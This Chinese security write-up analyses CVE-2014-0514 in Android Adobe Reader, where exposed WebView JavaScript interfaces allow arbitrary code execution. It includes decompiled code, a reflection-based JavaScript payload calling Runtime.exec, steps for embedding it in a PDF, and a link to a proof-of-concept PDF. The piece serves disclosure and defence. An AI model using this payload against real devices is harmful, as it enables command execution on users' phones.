# Android Adobe Reader 任意代码执行分析(附POC)

0x00 描述
-------

* * *

前几天老外在fd还有exploit-db上，公布了Adobe Reader任意代码执行的漏洞。

漏洞编号： [CVE: 2014-0514](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0514)

AdobeReader安装量比较大，又和浏览器容器不同，分析一下。

Android Adobe Reader 调用webview的不安全的Javascript interfaces。

导致可以执行任意js代码。具体查看[WebView中接口隐患与手机挂马利用](http://drops.wooyun.org/papers/548)。

影响版本：

理论上Android Adobe Reader 11.2.0之前的版本多存在，Android version 11.1.3成功利用。

我查看了之前的几个版本例如Android Adobe Reader 11.1.2 如下图，问题也应该存在。

![enter image description here](http://drops.javaweb.org/uploads/images/be0cb8b0f531dab6d6551fdebc2215a99ab1efef.jpg)

0x01利用
------

* * *

从反编译出来的java代码看

```
public class ARJavaScript
{
[...]

   public ARJavaScript(ARViewerActivity paramARViewerActivity)
   {
[...]
      this.mWebView.addJavascriptInterface(new ARJavaScriptInterface(this), "_adobereader");
      this.mWebView.addJavascriptInterface(new ARJavaScriptApp(this.mContext), "_app");
      this.mWebView.addJavascriptInterface(new ARJavaScriptDoc(), "_doc");
      this.mWebView.addJavascriptInterface(new ARJavaScriptEScriptString(this.mContext), "_escriptString");
      this.mWebView.addJavascriptInterface(new ARJavaScriptEvent(), "_event");
      this.mWebView.addJavascriptInterface(new ARJavaScriptField(), "_field");
      this.mWebView.setWebViewClient(new ARJavaScript.1(this));
      this.mWebView.loadUrl("file:///android_asset/javascript/index.html");
   }

```

`_adobereader，_app，_doc，_escriptString，_event，_field`这几个变量都会存在任意代码执行的问题.

利用代码和之前一样。

```
function execute(bridge, cmd) {
   return bridge.getClass().forName('java.lang.Runtime')
      .getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}

if(window._app) {
   try {
      var path = '/data/data/com.adobe.reader/mobilereader.poc.txt';
      execute(window._app, ['/system/bin/sh','-c','echo \"Lorem ipsum\" > ' + path]);
      window._app.alert(path + ' created', 3);
   } catch(e) {
      window._app.alert(e, 0);
   }
}

```

这里不同是构造 恶意的PDF。

首先需要一个PDF编辑器，比如Adobe Acrobat（flash达人pz推荐）.

然后添加表单按钮或者书签等，调用事件添加

![enter image description here](http://drops.javaweb.org/uploads/images/9e8de496378984b1d4bb04dfaa866dc00ecd551e.jpg)

我这里看了下button最好演示，和老外的那个poc一样基本上.

导入到android虚拟机里，打开，成功复现。

![enter image description here](http://drops.javaweb.org/uploads/images/93c7daefdf600f9fd06c9b0e82e8d38ce5052031.jpg)

0x02 扩展
-------

* * *

一些网盘或浏览器，看看能否调用adobe reader来预览pdf的应用可能会存在这个漏洞，大部分应用都是直接下载pdf到本地。可以再测试一些能预览pdf的邮箱之类的应用。

0x03 修复
-------

* * *

新版本的Adobe Reader 11.2.0为4.2以上的用户使用了安全的js调用接口 @JavascriptInterface，老版本的用户则在adobereader禁用了表单的js执行。 不知道那些杀毒软件能不能检测到这些恶意poc呢 :）

附上[poc.pdf](http://static.wooyun.org/20141017/2014101711445669638.pdf)